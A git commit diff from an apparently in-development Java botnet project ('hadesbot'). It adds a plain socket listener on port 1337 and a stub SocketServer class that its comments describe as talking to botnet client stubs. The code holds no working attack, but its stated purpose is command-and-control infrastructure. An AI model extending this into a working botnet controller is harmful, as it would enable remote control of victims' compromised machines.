7ed30f65b3d278c78917c6ee1d95a71f5654795b
ziuee <remig06@hotmail.com>
2023-05-27 23:57:48 +0200

    Started on ``SocketServer.java``

--- src/main/java/net/hadesbot/server/Server.java
+++ src/main/java/net/hadesbot/server/Server.java
@@ -2,6 +2,11 @@ package net.hadesbot.server;
 
 import net.hadesbot.server.cli.CommandLineParser;
 import net.hadesbot.server.cli.Configuration;
+import net.hadesbot.server.socket.SocketServer;
+
+import java.io.IOException;
+import java.net.ServerSocket;
+import java.net.Socket;
 
 /**
  * The server class responsible for handling server operations.
@@ -13,16 +18,18 @@ import net.hadesbot.server.cli.Configuration;
 
 public class Server {
 
+    private final Configuration configuration;
+
     public Server(final String[] args) {
         /**
          * Constructs a new instance of the Server class.
          */
-        final Configuration configuration = new Configuration();
-        configuration.set("address", "");
-        configuration.set("port", 1337);
-        configuration.set("password", "");
+        this.configuration = new Configuration();
+        this.configuration.set("address", "");
+        this.configuration.set("port", 1337);
+        this.configuration.set("password", "");
 
-        CommandLineParser commandLineParser = new CommandLineParser(configuration, args);
+        CommandLineParser commandLineParser = new CommandLineParser(this.configuration, args);
         commandLineParser.parseArguments();
     }
 
@@ -30,6 +37,25 @@ public class Server {
      * Starts the server.
      */
     public void start() {
+        try (ServerSocket serverSocket = new ServerSocket(Integer.parseInt(String.valueOf(this.configuration.get("port"))))) {
+            int port = serverSocket.getLocalPort();
+            System.out.println("Started server on port " + port + "!");
 
+            while (!Thread.currentThread().isInterrupted()) {
+                try {
+                    Socket socket = serverSocket.accept();
+                    new SocketServer(this, socket);
+                } catch (IOException exception) {
+                    System.err.println("Connection error (IO Exception - A): " + exception.getMessage() + " | " + exception.getCause().toString());
+                }
+            }
+        } catch (IOException exception) {
+            System.err.println("Error occurred while starting the server:");
+            exception.printStackTrace();
+        } catch (NumberFormatException exception) {
+            System.err.println("Invalid port configuration specified!");
+            exception.printStackTrace();
+        }
     }
+
 }
--- src/main/java/net/hadesbot/server/socket/SocketServer.java
+++ src/main/java/net/hadesbot/server/socket/SocketServer.java
@@ -1,5 +1,10 @@
 package net.hadesbot.server.socket;
 
+import jdk.nashorn.internal.objects.annotations.Getter;
+import net.hadesbot.server.Server;
+
+import java.net.Socket;
+
 /**
  * The SocketServer class represents the server-side socket operations of the botnet system.
  * It handles incoming connections and manages communication with the client stubs.
@@ -10,5 +15,13 @@ package net.hadesbot.server.socket;
  */
 
 public class SocketServer {
+
+    public final Server server;
+    public final Socket socket;
+
+    public SocketServer(Server server, Socket socket) {
+        this.server = server;
+        this.socket = socket;
+    }
 
 }
